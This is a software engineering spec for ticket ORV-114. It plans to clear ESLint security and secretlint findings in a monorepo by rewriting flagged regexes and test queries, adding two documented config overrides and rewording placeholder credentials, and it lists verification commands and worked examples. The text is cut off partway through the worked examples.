---
issue: ORV-114 (https://tpetkaew.atlassian.net/browse/ORV-114)
lane: S
version: 1.0
---

# ORV-114: code and secret scan findings outside guard paths to zero (part 1)

## Why

ORV-108 added two scans to the quality gate: `pnpm scan:code` (ESLint with eslint-plugin-security) and `pnpm scan:secrets` (secretlint). Both run in report mode: `scripts/quality-gate.mjs` and `.github/workflows/ci.yml` pass `--report`, so a finding prints and nothing blocks (`scripts/scan.mjs`, lines 7 to 10). A scan can block only when no finding is left. On `develop` at `5199e26` the code scan lists 76 findings and the secret scan 16 (worked examples 1 and 2).

The work is split in two (ORV-114 comment 10256, decided under the owner's delegation, with lane S). Part 1 is this spec: the 40 code findings outside `scripts/ovl/` and all 16 secret findings go to 0, each fixed or switched off with a stated reason. Part 2 goes into PR 137, because it touches guard paths: the 36 code findings under `scripts/ovl/`, the removal of `--report` from `scripts/quality-gate.mjs` and `.github/workflows/ci.yml`, and a test that a new finding fails the gate.

The two scans are CI checks over the files in the tree, not hooks that judge a tool call, so the guard frame of L-0012 does not apply. They are a guard rail for agents that follow the rules: an override lives in `eslint.security.config.mjs`, which any PR can change and which shows in the diff that review reads. Nothing outside the session enforces the scan config. Neither `eslint.security.config.mjs` nor `scripts/scan.mjs` matches `GUARD_PATH` in `scripts/ovl/write-guard.mjs`.

Nothing here is simulated. There is no UI text: the stories that change only change how a play finds an element, and the scans print developer output in English.

## Story

As the main session preparing part 2, I want `pnpm scan:code` and `pnpm scan:secrets` to list no file outside `scripts/ovl/`, so that part 2 can drop `--report` and both scans block.

## The finding set

The set is the output of the two scans on `develop` at `5199e26`, one finding per line as `file:line rule` (`scripts/scan.mjs` line 103). Counts per level (worked examples 1 and 2):

- Code scan: 76 findings. 36 are under `scripts/ovl/` (part 2, left out here). 40 are in scope: 28 `security/detect-non-literal-regexp`, 11 `security/detect-unsafe-regex` and 1 `security/detect-non-literal-fs-filename`.
- Secret scan: 16 findings, none under a guard path, all in scope: 15 `@secretlint/secretlint-rule-basicauth` and 1 `@secretlint/secretlint-rule-database-connection-string`.

A class is a scanner rule together with the form of the flagged code or text. Each class has one rule under Rules and bounds, and the Findings tables give the class of each finding. Rows follow the scan's order: file path, then line.

## Rules and bounds

Each rule below is the one home of its outcome. Other sections name the rule only.

### How a finding is cleared

- **scan-clear-1**: Each of the 56 in-scope findings (the two Findings tables) is cleared by the rule of its class: a rewrite of the flagged code that the scanner no longer flags and that accepts the same input, a rewrite of the flagged doc or test text, or an override under `scan-override-1`. These are not used: an inline `eslint-disable` comment that names a `security/` rule (no package ESLint config loads eslint-plugin-security, so the package's own `pnpm lint` may report the rule as not found), a `secretlint-disable` comment (only `@secretlint/secretlint-rule-preset-recommend` is installed, with no comment filter rule, so the comment has no effect), an entry in `.secretlintignore`, an `allows` option in `.secretlintrc.json`, a new dependency, and any change to `scripts/scan.mjs`.
- **scan-override-1**: An override is one block added at the end of the array in `eslint.security.config.mjs`. Its `files` holds one exact repo path, its `rules` set one `security/` rule to `"off"`, and a comment above it names each flagged `file:line`, says why the input that reaches the call is not attacker-controlled, and says that the block also hides a later finding of that rule in that file. Exactly two blocks:
  1. `packages/db/src/migrate.ts`, `security/detect-non-literal-fs-filename`, line 31: `realpathSync(started)`, where `started` is `path.resolve(argv1)` (line 28) and `argv1` is `process.argv[1]` (line 38), the script path the operator started the migration with. The module runs as a CLI with `MIGRATION_DATABASE_URL` (line 39); no request reaches it. A rewrite without the call would change how `isEntry` resolves symlinks (its comment, lines 20 to 25).
  2. `packages/intent-engine/src/interpreter.ts`, `security/detect-non-literal-regexp`, lines 319 and 320: the pattern is a lexicon term passed through `escape` (line 314), so every regex metacharacter in it is literal. The terms come from the `lexicon` argument of `interpretWithRules` (line 360), whose default is `RULE_LEXICON` (line 242). The 7 calls in the repo (`grep -rn 'interpretWithRules(' packages apps`, the definition left out) pass no lexicon: `directions.ts:140`, `interpreter.ts:426`, `suggest.ts:129`, `url-analyser.ts:545`, `interpreter.test.ts:15` and `llm-interpreter.test.ts:62` in `packages/intent-engine/src`, and `packages/auth/src/directions.integration.test.ts:46`. The user's brief is the string searched, never the pattern. A rewrite without `RegExp` would change the interpreter's matching code, and resolver logic is a risk flag that lane S keeps out (AGENTS.md, Lanes and gates).

### Code scan classes

- **scan-unsafe-1**: A group that holds a quantifier and is made optional, `(?:X)?` or `(X)?`, is written `(?:X|)`: an empty second branch in place of `?`. The engine tries X first and then nothing, as `?` does, so the match and the captures that remain are the same, and the group is no longer a repetition inside a repetition. A group repeated a fixed number of times, `(X){n}`, is written out n times. The six regexes:
  - `no-raw-style-classes.mjs:20`: `(?:-[trblse]{1,2})?` becomes `(?:-[trblse]{1,2}|)`. `match[0]`, which the lint message prints, is unchanged.
  - `visual-asserts.stories.tsx:138`: each `(\.\d+)?` becomes `(?:\.\d+|)`. `toThrow` only tests the message, so the dropped captures were unused.
  - `colour.ts:92` (`COMPONENT`) and `colour.ts:93` (`HUE`): `(?:\.\d*)?` becomes `(?:\.\d*|)` and `(?:e[+-]?\d+)?` becomes `(?:e[+-]?\d+|)`. Groups 1 and 2, which `component` and `hueOf` read, keep their place. The comment above them stays.
  - `read-page.ts:436`: `/^[0-9]+(\.[0-9]+){3}$/` becomes `/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/` (read through `.test` only).
  - `check-knowledge.mjs:25` (`CONFIDENCE_FORMAT`): `/^(0(\.\d+)?|1(\.0+)?)$/` becomes `/^(?:0(?:\.\d+|)|1(?:\.0+|))$/`. Every use is `.test`: lines 273, 323, 324 and 364.
- **scan-unsafe-2**: A regex that accepts runs joined by single separators, `^R+(?:SR+)*$` with R a class of run characters and S a class of separators, is written in three parts: `(?!S)` (the text does not start with a separator), `(?![\s\S]*S(?:S|$))` (no separator is followed by another separator or by the end), and a class of the R and S characters repeated to the end. It is `[\s\S]` and not `.`, so a line terminator cannot hide a pair of separators. The new form accepts the same strings, and each of the three is read only as a test (`.test` or zod `.regex`). The three:
  - `knowledge.ts:13` (`slugSchema`), runs `[a-z0-9]`, separators `.` and `-`: `/^(?![.-])(?![\s\S]*[.-](?:[.-]|$))[a-z0-9.-]+$/`, with the message "Use a lowercase slug." kept.
  - `page.ts:120` (in `familySubject`), runs `[a-z0-9]`, separators space and `-`: `/^(?![ -])(?![\s\S]*[ -](?:[ -]|$))[a-z0-9 -]+$/`.
  - `render-snapshot.ts:32` (`PATH_FORM`): the text `html`, then segments of any character but `>` and ASCII whitespace, each after a `>`: `/^html(?=>|$)(?![\s\S]*>(?:>|$))[^\t\n\f\r ]*$/`, with the comment on the line kept.
- **scan-unsafe-3**: `recipes.test.ts:82` captures the body of each `@media (prefers-reduced-transparency: reduce)` block with `([\s\S]*?\})\s*\}` in place of `((?:\s*[^{}]+\{[^{}]*\})*)\s*\}`: the body runs to the first `}` that is followed by optional whitespace and a second `}`. On the real `recipes.css` both forms give the same five bodies (worked example 5). They differ only on an empty block (`{}` with no rule in it), which `recipes.css` does not hold; the test reads only that file.
- **scan-unsafe-4**: `COLLECTOR_CHECK` (`check-knowledge.mjs:142` to 143) becomes a function `isCollectorCheck(check)`, which line 189 calls. It is true when `check` starts and ends with a backtick and the text between them, split on single spaces, gives `node`, then `scripts/ovl/metrics.mjs`, then one of `collect`, `report`, `session` and `due`, then zero or more words that each pass `COLLECTOR_ARG = /^-{0,2}[A-Za-z0-9_][\w.\/:=-]*$/`. It accepts the same checks as the regex (worked example 6). The comment on line 141 stays.
- **scan-regexp-1**: Where a play passes a `RegExp` built from a label or a title as the `name` of a Testing Library role query, the `name` becomes a function of the accessible name. The result is the same because no label or title that reaches these calls holds a regex metacharacter: the Thai command labels (`grep -nE 'th: "[^"]*[.*+?^${}()|[\]\\]' packages/design-system/src/commands/generated.ts` prints nothing), the direction messages `reading` and `brief` (`packages/design-system/src/i18n/messages/en.ts:245` and `:254`, `th.ts:248` and `:257`), `fixtures.mixed` (`packages/design-system/src/components/fixtures.ts:12`), and the literal titles and tile names at the call sites (worked example 7). The three forms:
  - `new RegExp(L)` becomes `(name: string) => name.includes(L)` at `CanvasContextMenu.stories.tsx` lines 62, 88, 102, 124, 143 and 192, `CanvasControls.stories.tsx:40`, `Card.stories.tsx:56`, and `DirectionStudio.stories.tsx` lines 64, 135, 400, 441, 471 and 507 (14 findings).
  - `` new RegExp(`^${L}`) `` becomes `(name: string) => name.startsWith(L)` at `BlockLibrary.stories.tsx:56` and `CanvasContextMenu.stories.tsx:68` (2 findings).
  - `` new RegExp(`^${title},`) `` becomes `` (name: string) => name.startsWith(`${title},`) `` at `CanvasBoard.stories.tsx:58`, `CanvasContextMenu.stories.tsx:31`, `NodeGroup.stories.tsx:30` and `NodeToolbar.stories.tsx:33` (4 findings).
- **scan-regexp-2**: A pattern built from a closed set of constants becomes a literal that names them:
  - `check-copy.test.ts:67` to 69: `LATIN_JARGON`, read only on line 69, is removed, and `LATIN_WORD` becomes `/(?<![A-Za-z0-9_])(?:API|endpoint|payload|JSON|null|undefined)(?![A-Za-z0-9_])/`, the six words in their order.
  - `quality-gate.test.mjs:354` to 355: the loop runs over `[/\bcommits\b/, /\bsecrets\b/, /\bcodescan\b/]`; the test name stays.
  - `check-knowledge.mjs:217`: a module-level `ENTRY_FILE_NAME = { K: /^(K-\d{4})-[a-z0-9-]+\.md$/, L: /^(L-\d{4})-[a-z0-9-]+\.md$/ }`, read as `name.match(ENTRY_FILE_NAME[prefix])`. `loadEntries` is called with `"K"` (line 258) and `"L"` (line 259) only.
- **scan-regexp-3**: `badge-dot.test.ts:43` reads the declaration of each variant through one literal, `DOT_LINE = /--cmp-badge-dot-([a-z]+):\s*([^;]+);/g`, as `const line = [...generated.matchAll(DOT_LINE)].find((m) => m[1] === variant)`, and the assertion reads `line?.[2]`. The six `VARIANTS` (line 18) are lowercase letters only.
- **scan-regexp-4**: `profiles.test.ts:216` and `:317` assert with `toContain` in place of `toMatch(new RegExp(...))`: `` toContain(`${path} is locked`) `` and `` toContain(`${path} carries ORIVILO's identity`) ``. The messages print the path as written (`packages/design-system/src/profiles/model.ts:176` and `:228`). `toContain` is stricter: the old pattern escaped only the first dot of the path.

### Secret scan classes

- **scan-secret-1**: In each line of the 15 basicauth findings, the password word of the URL, `secret` or `s3cret`, becomes `password`. The rule skips a password that contains `password` (`isLikelyRealPassword` and its placeholder list in the installed preset 13.0.7, `@secretlint/secretlint-rule-preset-recommend/module/index.js` lines 5261 to 5277 and 5311 to 5326). User names, hosts, ports and paths stay. `docs/specs/ORV-128/spec.md:669` and `:670` print the output of the example on line 665, so they change with it. In `read-page.test.ts` each row keeps its place and its expected refusal; line 114, whose URL has no user name, is not flagged and stays.
- **scan-secret-2**: `docs/context/handoff.md:98` becomes `` `DATABASE_URL=postgres://orivilo_app:{password}@localhost:5432/orivilo_dev`, where `{password}` is `orivilo_app_test`, the password the line above sets. `` The rule skips a password shaped like a template (`isVariableLikeString`, the pattern `\{[^}]{1,50}\}` on line 6336 of the same module). The value is the local test password that the database tests set on every run (line 97), not a secret, so the doc keeps it, outside the URL.

### Bounds

- No file under `GUARD_PATH` changes, so the 36 findings under `scripts/ovl/` stay, on the same lines (Check 2).
- No runtime behaviour changes. Each rewritten regex accepts the same strings (worked examples 3 to 6), each rewritten role query finds the same element (worked example 7), and the two overrides change no code. Two differences are accepted, each stated in its rule: `toContain` is stricter (`scan-regexp-4`), and the lazy body differs on an empty block (`scan-unsafe-3`).
- `slugSchema` is not part of `llmAnswerSchema` (`packages/intent-engine/src/llm-interpreter.ts:34` to 75), so the JSON Schema sent to OpenRouter does not change.
- The timing tests in `colour.test.ts` (lines 393 to 408, tokens of 1 MB) keep guarding linear time: `(?:X|)` tries its branches in the order `?` did, so the work per token is the same.

## Findings

Scanner rules are written without their prefix: `security/detect-` for the code scan, `@secretlint/secretlint-rule-` for the secret scan. A line listed more than once holds that many findings, as the scan prints them.

### Code scan: 40 findings

| File                                                                                      | Lines                              | Scanner rule            | Class           |
| ----------------------------------------------------------------------------------------- | ---------------------------------- | ----------------------- | --------------- |
| `packages/db/src/migrate.ts`                                                              | 31                                 | non-literal-fs-filename | scan-override-1 |
| `packages/design-system/eslint/no-raw-style-classes.mjs`                                  | 20                                 | unsafe-regex            | scan-unsafe-1   |
| `packages/design-system/src/components/badge/badge-dot.test.ts`                           | 43                                 | non-literal-regexp      | scan-regexp-3   |
| `packages/design-system/src/components/block-library/BlockLibrary.stories.tsx`            | 56                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/canvas-board/CanvasBoard.stories.tsx`              | 58                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/canvas-context-menu/CanvasContextMenu.stories.tsx` | 31, 62, 68, 88, 102, 124, 143, 192 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/canvas-controls/CanvasControls.stories.tsx`        | 40                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/card/Card.stories.tsx`                             | 56                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/direction-studio/DirectionStudio.stories.tsx`      | 64, 135, 400, 441, 471, 507        | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/node-group/NodeGroup.stories.tsx`                  | 30                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/components/node-toolbar/NodeToolbar.stories.tsx`              | 33                                 | non-literal-regexp      | scan-regexp-1   |
| `packages/design-system/src/profiles/profiles.test.ts`                                    | 216, 317                           | non-literal-regexp      | scan-regexp-4   |
| `packages/design-system/src/recipes/recipes.test.ts`                                      | 82                                 | unsafe-regex            | scan-unsafe-3   |
| `packages/design-system/src/testing/visual-asserts.stories.tsx`                           | 138                                | unsafe-regex            | scan-unsafe-1   |
| `packages/design-system/tests/check-copy.test.ts`                                         | 69                                 | non-literal-regexp      | scan-regexp-2   |
| `packages/intent-engine/src/interpreter.ts`                                               | 319, 320                           | non-literal-regexp      | scan-override-1 |
| `packages/intent-engine/src/knowledge.ts`                                                 | 13                                 | unsafe-regex            | scan-unsafe-2   |
| `packages/intent-engine/src/measures/colour.ts`                                           | 92, 93                             | unsafe-regex            | scan-unsafe-1   |
| `packages/intent-engine/src/measures/page.ts`                                             | 120                                | unsafe-regex            | scan-unsafe-2   |
| `packages/intent-engine/src/read-page.ts`                                                 | 436                                | unsafe-regex            | scan-unsafe-1   |
| `packages/intent-engine/src/render-snapshot.ts`                                           | 32                                 | unsafe-regex            | scan-unsafe-2   |
| `scripts/check-knowledge.mjs`                                                             | 25                                 | unsafe-regex            | scan-unsafe-1   |
| `scripts/check-knowledge.mjs`                                                             | 143                                | unsafe-regex            | scan-unsafe-4   |
| `scripts/check-knowledge.mjs`                                                             | 217                                | non-literal-regexp      | scan-regexp-2   |
| `scripts/quality-gate.test.mjs`                                                           | 355                                | non-literal-regexp      | scan-regexp-2   |

By class: `scan-regexp-1` 20, `scan-regexp-2` 3, `scan-regexp-3` 1, `scan-regexp-4` 2, `scan-unsafe-1` 6, `scan-unsafe-2` 3, `scan-unsafe-3` 1, `scan-unsafe-4` 1, `scan-override-1` 3 (1 non-literal-fs-filename, 2 non-literal-regexp). Total 40.

### Secret scan: 16 findings

| File                                           | Lines                             | Scanner rule               | User and password                    | Class         |
| ---------------------------------------------- | --------------------------------- | -------------------------- | ------------------------------------ | ------------- |
| `docs/context/handoff.md`                      | 98                                | database-connection-string | `orivilo_app` and `orivilo_app_test` | scan-secret-2 |
| `docs/specs/ORV-128/spec.md`                   | 338, 338, 338, 665, 665, 669, 670 | basicauth                  | `user:secret` 5, `alice:s3cret` 2    | scan-secret-1 |
| `docs/specs/ORV-128/tech.md`                   | 1276                              | basicauth                  | `user:secret` 1                      | scan-secret-1 |
| `docs/specs/ORV-133/spec.md`                   | 61, 61, 61                        | basicauth                  | `user:secret` 3                      | scan-secret-1 |
| `packages/intent-engine/src/read-page.test.ts` | 112, 126, 133, 175                | basicauth                  | `user:secret` 4                      | scan-secret-1 |

By class: `scan-secret-1` 15, `scan-secret-2` 1. Total 16.

## Files

The PR changes these 31 files and no other:

- `eslint.security.config.mjs` (`scan-override-1`)
- `packages/design-system/eslint/no-raw-style-classes.mjs` (`scan-unsafe-1`)
- `packages/design-system/src/components/badge/badge-dot.test.ts` (`scan-regexp-3`)
- `packages/design-system/src/components/block-library/BlockLibrary.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/canvas-board/CanvasBoard.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/canvas-context-menu/CanvasContextMenu.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/canvas-controls/CanvasControls.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/card/Card.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/direction-studio/DirectionStudio.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/node-group/NodeGroup.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/components/node-toolbar/NodeToolbar.stories.tsx` (`scan-regexp-1`)
- `packages/design-system/src/profiles/profiles.test.ts` (`scan-regexp-4`)
- `packages/design-system/src/recipes/recipes.test.ts` (`scan-unsafe-3`)
- `packages/design-system/src/testing/visual-asserts.stories.tsx` (`scan-unsafe-1`)
- `packages/design-system/tests/check-copy.test.ts` (`scan-regexp-2`)
- `packages/intent-engine/src/knowledge.ts` (`scan-unsafe-2`)
- `packages/intent-engine/src/knowledge.test.ts` (Tests)
- `packages/intent-engine/src/measures/colour.ts` (`scan-unsafe-1`)
- `packages/intent-engine/src/measures/page.ts` (`scan-unsafe-2`)
- `packages/intent-engine/src/measures/page.test.ts` (Tests)
- `packages/intent-engine/src/read-page.ts` (`scan-unsafe-1`)
- `packages/intent-engine/src/read-page.test.ts` (`scan-secret-1`)
- `packages/intent-engine/src/render-snapshot.ts` (`scan-unsafe-2`)
- `scripts/check-knowledge.mjs` (`scan-unsafe-1`, `scan-unsafe-4`, `scan-regexp-2`)
- `scripts/check-knowledge.test.mjs` (Tests)
- `scripts/quality-gate.test.mjs` (`scan-regexp-2`)
- `docs/context/handoff.md` (`scan-secret-2`)
- `docs/specs/ORV-128/spec.md` (`scan-secret-1`)
- `docs/specs/ORV-128/tech.md` (`scan-secret-1`)
- `docs/specs/ORV-133/spec.md` (`scan-secret-1`)
- `docs/specs/ORV-114/spec.md` (this spec)

`packages/db/src/migrate.ts` and `packages/intent-engine/src/interpreter.ts` do not change (`scan-override-1`), and neither do `scripts/scan.mjs`, `.secretlintrc.json` and `.secretlintignore` (`scan-clear-1`).

## Checks

Run from the repo root.

1. `pnpm -s scan:code --report | grep -v '^report mode' | grep -v '^scripts/ovl/'`
2. On a checkout of `5199e26`, `pnpm -s scan:code --report > "$TMPDIR/orv114-develop.txt"`; on the PR head, `pnpm -s scan:code --report > "$TMPDIR/orv114-head.txt"`; then `diff <(grep '^scripts/ovl/' "$TMPDIR/orv114-develop.txt") <(grep '^scripts/ovl/' "$TMPDIR/orv114-head.txt") && tail -n 1 "$TMPDIR/orv114-head.txt"`
3. `pnpm -s scan:secrets; echo "exit $?"`
4. `git grep -nE 'eslint-disable.*security/|secretlint-disable' -- apps packages scripts; git diff origin/develop -- .secretlintrc.json .secretlintignore package.json pnpm-lock.yaml scripts/scan.mjs`
5. `git diff origin/develop -- eslint.security.config.mjs`
6. `pnpm --filter @orivilo/intent-engine exec vitest run src/knowledge.test.ts src/measures/page.test.ts src/measures/colour.test.ts src/render-snapshot.test.ts src/read-page.test.ts`
7. `node --test scripts/check-knowledge.test.mjs scripts/quality-gate.test.mjs`
8. `grep -rnE 'user:secret|alice:s3cret' docs/specs/ORV-128 docs/specs/ORV-133 packages/intent-engine/src/read-page.test.ts`, then `grep -c 'orivilo_app:{password}@' docs/context/handoff.md`
9. `git diff --name-only origin/develop...HEAD`
10. `pnpm lint && pnpm typecheck && pnpm test && pnpm test:scripts && pnpm check:knowledge && pnpm format:check && pnpm build`

## Acceptance criteria

| #   | Given                                                                | When                        | User sees                                                           | Data effect                      |
| --- | -------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------------- | -------------------------------- |
| 1   | `develop` at `5199e26`                                               | Worked examples 1 and 2 run | The counts written under each                                       | None                             |
| 2   | The PR head                                                          | Check 1 runs                | No output: every code finding left is under `scripts/ovl/`          | None                             |
| 3   | The PR head                                                          | Check 2 runs                | No diff, then `report mode: 36 findings, not blocking`              | None                             |
| 4   | The PR head                                                          | Check 3 runs                | `scan secrets: 0 findings`, then `exit 0`                           | None                             |
| 5   | The PR head                                                          | Check 4 runs                | No output (`scan-clear-1`)                                          | None                             |
| 6   | The PR head                                                          | Check 5 runs                | Two added blocks as `scan-override-1` states, and no removed line   | Two overrides in the scan config |
| 7   | The PR head                                                          | Worked examples 3 to 11 run | The output written under each                                       | None                             |
| 8   | The PR head                                                          | Check 6 runs                | All pass, with the two new tests of Tests                           | None                             |
| 9   | `knowledge.ts` without `(?![.-])`, then `page.ts` without `(?![ -])` | Check 6 runs on each        | That file's leading-separator case fails; restored, it passes       | None                             |
| 10  | The PR head                                                          | Check 7 runs                | All pass, with the new test of Tests                                | None                             |
| 11  | `isCollectorCheck` without its `node` word check                     | Check 7 runs                | The new test fails on the `npx` input; restored, it passes          | None                             |
| 12  | The PR head                                                          | Check 8 runs                | No output from the first command and `1` from the second            | Example credentials reworded     |
| 13  | The PR head                                                          | Check 9 runs                | The 31 paths under Files; none matches `GUARD_PATH` (comment 10256) | None                             |
| 14  | The PR head                                                          | Check 10 runs               | All pass                                                            | None                             |

## Tests

- New in `packages/intent-engine/src/knowledge.test.ts`: `ORV-114 scan-unsafe-2: slugSchema accepts and refuses the same slugs as before`. It accepts `color.semantics-separate`, `lexicon-1`, `a` and `a1-b2.c3`, and refuses the empty string, `-a`, `a-`, `.a`, `a.`, `a--b`, `a..b`, `a-.b`, `a.-b`, `A`, `a b` and `a` followed by a line feed (the lists of worked example 4). Row 9 breaks it on `-a`.
- New in `packages/intent-engine/src/measures/page.test.ts`: `ORV-114 scan-unsafe-2: familySubject gives three parts when a separator is doubled or trails`. `familySubject("body", f)` for `Open -Sans`, `Open- Sans` and `Inter-` each gives a subject that matches `/^body\.[a-z0-9-]+\.[0-9a-f]{8}$/`. Row 9 breaks the existing row `-apple-system` (line 128).
- New in `scripts/check-knowledge.test.mjs`: `ORV-114 scan-unsafe-4: a Check with another command, another script or a stray space fails`. Each of `` `npx scripts/ovl/metrics.mjs due` ``, `` `node scripts/ovl/other.mjs due` ``, the `due` command with two spaces before `due`, and the `due` command with a space before the closing backtick gives the `collector command` problem, as the test at line 426 checks. Row 11 breaks it on the `npx` input.
- Unchanged, and still guarding the rewrites: `render-snapshot.test.ts` lines 179 to 190 (`PATH_FORM`), `colour.test.ts` lines 393 to 408 (linear time), the refusal and IP rows of `read-page.test.ts`, `check-knowledge.test.mjs` lines 426 to 457 (`isCollectorCheck`) and its confidence tests, `recipes.test.ts` itself (an empty capture fails its loop), `badge-dot.test.ts` itself (a variant not found reads `undefined` and fails `toMatch`), and the plays of the eight stories (a role query that finds nothing throws).

## Worked examples

Run from the repo root. Each line is printed as Node prints it; there is no rounding. `safe` is the `safe-regex` 2.1.1 that eslint-plugin-security 4.2.0 calls, given the regex as text, as the rule gives it.

1. The code findings by rule. Expected output on `5199e26`: `76 40 36 {"security/detect-non-literal-fs-filename":1,"security/detect-unsafe-regex":11,"security/detect-non-literal-regexp":28}`. On the PR head: `36 0 36 {}`.

```bash
pnpm -s scan:code --report | node -e 'const l=require("fs").readFileSync(0,"utf8").split("\n").filter(x=>/^\S+:\d+ /.test(x));const o=l.filter(x=>!x.startsWith("scripts/ovl/"));const by={};for(const x of o){const r=x.split(" ")[1];by[r]=(by[r]||0)+1}console.log(l.length,o.length,l.length-o.length,JSON.stringify(by))'
```

2. The secret findings by rule. Expected output on `5199e26`: `16 16 0 {"@secretlint/secretlint-rule-database-connection-string":1,"@secretlint/secretlint-rule-basicauth":15}`. On the PR head: `0 0 0 {}`.

```bash
pnpm -s scan:secrets --report | node -e 'const l=require("fs").readFileSync(0,"utf8").split("\n").filter(x=>/^\S+:\d+ /.test(x));const o=l.filter(x=>!x.startsWith("scripts/ovl/"));const by={};for(const x of o){const r=x.split(" ")[1];by[r]=(by[r]||0)+1}console.log(l.length,o.length,l.length-o.length,JSON.stringify(by))'
```

3. `scan-unsafe-1`: per regex, the old form, the new form, whether `safe` passes each, and whether both give the same match and read captures on every input (`k` is the number of captures the code reads). Inputs are copied from `colour.test.ts` (lines 190 to 194), the Index cells of `docs/knowledge/README.md`, the IP rows of `read-page.test.ts` and the message of `visual-asserts.ts` line 181, with edge cases added. Expected output, six lines: `radius false true true`, `height false true true`, `confidence false true true`, `component false true true`, `hue false true true`, `ipv4 false true true`.

```bash
node -e 'const safe=require(require.resolve("safe-regex",{paths:[require.resolve("eslint-plugin-security")]}));const C=[["radius",0,/(?<![\w-])rounded(?:-[trblse]{1,2})?-(?:none|xs|sm|md|lg|xl|2xl|3xl|4xl|full|\[)/,/(?<![\w-])rounded(?:-[trblse]{1,2}|)-(?:none|xs|sm|md|lg|xl|2xl|3xl|4xl|full|\[)/,["rounded-lg","p-2 rounded-t-lg","rounded-tl-md","rounded-se-xs","rounded-sm","rounded-control","x-rounded-lg","rounded-[4px]"]],["height",0,/is \d+(\.\d+)? px tall but .* is \d+(\.\d+)? px/,/is \d+(?:\.\d+|) px tall but .* is \d+(?:\.\d+|) px/,["a is 40 px tall but b is 20 px","a is 40.5 px tall but b is 20.25 px","a is 40. px tall but b is 20 px","a is 40 px tall"]],["confidence",0,/^(0(\.\d+)?|1(\.0+)?)$/,/^(?:0(?:\.\d+|)|1(?:\.0+|))$/,["0","0.85","0.9","1","1.0","1.5","0.","01",".5"]],["component",2,/^([+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?)(%?)$/i,/^([+-]?(?:\d+(?:\.\d*|)|\.\d+)(?:e[+-]?\d+|))(%?)$/i,["255","122","100%","50%","0%","1.","+.5","-1.5e3","2E+2%","1e","1.x","none","12px"]],["hue",2,/^([+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?)(deg|grad|rad|turn)?$/i,/^([+-]?(?:\d+(?:\.\d*|)|\.\d+)(?:e[+-]?\d+|))(deg|grad|rad|turn)?$/i,["30","30deg","0.5turn","1e2grad","10RAD","30px","deg"]],["ipv4",0,/^[0-9]+(\.[0-9]+){3}$/,/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/,["8.8.8.8","10.0.0.5","1.2.3","1.2.3.4.5","example.test"]]];for(const [n,k,a,b,ins] of C){const f=(r,s)=>JSON.stringify((r.exec(s)||[]).slice(0,k+1));console.log(n,safe(String(a)),safe(String(b)),ins.every(s=>f(a,s)===f(b,s)))}'
```

4. `scan-unsafe-2`: per regex, `safe` on the old and new form, and the number of inputs on which they disagree. Family inputs are the lowercased families of `page.test.ts` lines 123 to 135 with edge cases added; path inputs are the cases of `render-snapshot.test.ts` lines 22 and 179 to 190 with edge cases added. Expected output, three lines: `slug false true 0`, `family false true 0`, `path false true 0`.

```bash
node -e 'const safe=require(require.resolve("safe-regex",{paths:[require.resolve("eslint-plugin-security")]}));const C=[["slug",/^[a-z0-9]+(?:-[a-z0-9]+)*(?:\.[a-z0-9]+(?:-[a-z0-9]+)*)*$/,/^(?![.-])(?![\s\S]*[.-](?:[.-]|$))[a-z0-9.-]+$/,["color.semantics-separate","lexicon-1","a","a1-b2.c3","","-a","a-",".a","a.","a--b","a..b","a-.b","a.-b","A","a b","a\n"]],["family",/^[a-z0-9]+(?:[ -][a-z0-9]+)*$/,/^(?![ -])(?![\s\S]*[ -](?:[ -]|$))[a-z0-9 -]+$/,["inter","noto sans thai","sans-serif","-apple-system","sarabun_bold","3d sans","noto sans \u0e44\u0e17\u0e22","open -sans","open- sans","inter-","a  b"]],["path",/^html(?:>[^>\t\n\f\r ]+)*$/,/^html(?=>|$)(?![\s\S]*>(?:>|$))[^\t\n\f\r ]*$/,["html","html>body>p:nth-of-type(1)","body>p","html>>p","html>body>","html>body>p ","html>body>p:x:nth-of-type(1)","html>body>p\u00a0x:nth-of-type(1)","htmlx","html>a\u2028>>b","html>a\u000bb"]]];for(const [n,a,b,ins] of C)console.log(n,safe(String(a)),safe(String(b)),ins.filter(s=>a.test(s)!==b.test(s)).length)'
```

5. `scan-unsafe-3` on the real `recipes.css`, with comments removed as the test removes them: the number of bodies each form captures, whether the captures are equal, and `safe` on each. Expected output: `5 5 true false true`.

```bash
node -e 'const safe=require(require.resolve("safe-regex",{paths:[require.resolve("eslint-plugin-security")]}));const css=require("fs").readFileSync("packages/design-system/src/recipes/recipes.css","utf8").replace(/\/\*[\s\S]*?\*\//g,"");const a=/@media \(prefers-reduced-transparency: reduce\) \{((?:\s*[^{}]+\{[^{}]*\})*)\s*\}/g;const b=/@media \(prefers-reduced-transparency: reduce\) \{([\s\S]*?\})\s*\}/g;const A=[...css.matchAll(a)].map(m=>m[1]),B=[...css.matchAll(b)].map(m=>m[1]);console.log(A.length,B.length,JSON.stringify(A)===JSON.stringify(B),safe(String(a)),safe(String(b)))'
```

6. `scan-unsafe-4`: the checks of `check-knowledge.test.mjs` lines 428 to 453 plus the four new inputs of Tests and a lone backtick. Printed: how many the old regex accepts, on how many the old regex and `isCollectorCheck` disagree, and `safe` on the old regex and on `COLLECTOR_ARG`. Expected output: `5 0 false true`.

```bash
